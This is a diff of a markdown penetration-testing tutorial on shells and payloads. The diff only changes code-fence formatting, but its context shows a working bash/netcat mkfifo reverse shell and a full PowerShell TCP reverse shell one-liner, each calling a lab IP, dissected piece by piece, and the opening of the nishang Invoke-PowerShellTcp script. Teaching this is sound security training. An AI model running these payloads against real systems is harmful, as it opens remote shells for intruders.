@@ -14,8 +14,7 @@ Keep in mind that when we deliver and execute payloads, just like any other prog
 
 #### Netcat/Bash Reverse Shell One-liner
 
-```
-        shellsession
+```shellsession
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
 ```
 
@@ -23,8 +22,7 @@ The commands above make up a common one-liner issued on a Linux system to serve 
 
 #### Remove /tmp/f
 
-```
-        shellsession
+```shellsession
 rm -f /tmp/f;
 ```
 
@@ -32,8 +30,7 @@ Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent f
 
 #### Make A Named Pipe
 
-```
-        shellsession
+```shellsession
 mkfifo /tmp/f;
 ```
 
@@ -41,8 +38,7 @@ Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html
 
 #### Output Redirection
 
-```
-        shellsession
+```shellsession
 cat /tmp/f |
 ```
 
@@ -50,8 +46,7 @@ Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standa
 
 #### Set Shell Options
 
-```
-        shellsession
+```shellsession
 /bin/bash -i 2>&1 |
 ```
 
@@ -59,8 +54,7 @@ Specifies the command language interpreter using the `-i` option to ensure the s
 
 #### Open a Connection with Netcat
 
-```
-        shellsession
+```shellsession
 nc 10.10.14.12 7777 > /tmp/f
 ```
 
@@ -74,8 +68,7 @@ The shells & payloads we choose to use largely depend on which OS we are attacki
 
 #### Powershell One-liner
 
-```
-        cmd
+```bat
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
@@ -83,8 +76,7 @@ We will dissect the rather large PowerShell command you can see above. It may lo
 
 #### Calling PowerShell
 
-```
-        cmd
+```bat
 powershell -nop -c
 ```
 
@@ -92,8 +84,7 @@ Executes `powershell.exe` with no profile (`nop`) and executes the command/scrip
 
 #### Binding A Socket
 
-```
-        cmd
+```bat
 "$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
 ```
 
@@ -101,8 +92,7 @@ Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, wh
 
 #### Setting The Command Stream
 
-```
-        cmd
+```bat
 $stream = $client.GetStream();
 ```
 
@@ -110,8 +100,7 @@ Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and 
 
 #### Empty Byte Stream
 
-```
-        cmd
+```bat
 [byte[]]$bytes = 0..65535|%{0};
 ```
 
@@ -119,8 +108,7 @@ Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as th
 
 #### Stream Parameters
 
-```
-        cmd
+```bat
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 ```
 
@@ -128,8 +116,7 @@ Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET f
 
 #### Set The Byte Encoding
 
-```
-        cmd
+```bat
 {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
 ```
 
@@ -137,8 +124,7 @@ Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikiped
 
 #### Invoke-Expression
 
-```
-        cmd
+```bat
 $sendback = (iex $data 2>&1 | Out-String );
 ```
 
@@ -146,8 +132,7 @@ Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`i
 
 #### Show Working Directory
 
-```
-        cmd
+```bat
 $sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
 ```
 
@@ -155,8 +140,7 @@ Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable
 
 #### Sets Sendbyte
 
-```
-        cmd
+```bat
 $sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
 ```
 
@@ -164,8 +148,7 @@ Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte st
 
 #### Terminate TCP Connection
 
-```
-        cmd
+```bat
 $client.Close()"
 ```
 
@@ -173,8 +156,7 @@ This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system
 
 The one-liner we just examined together can also be executed in the form of a PowerShell script (`.ps1`). We can see an example of this by viewing the source code below. This source code is part of the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:
 
-```
-        powershell
+```powershell
 function Invoke-PowerShellTcp 
 { 
 <#
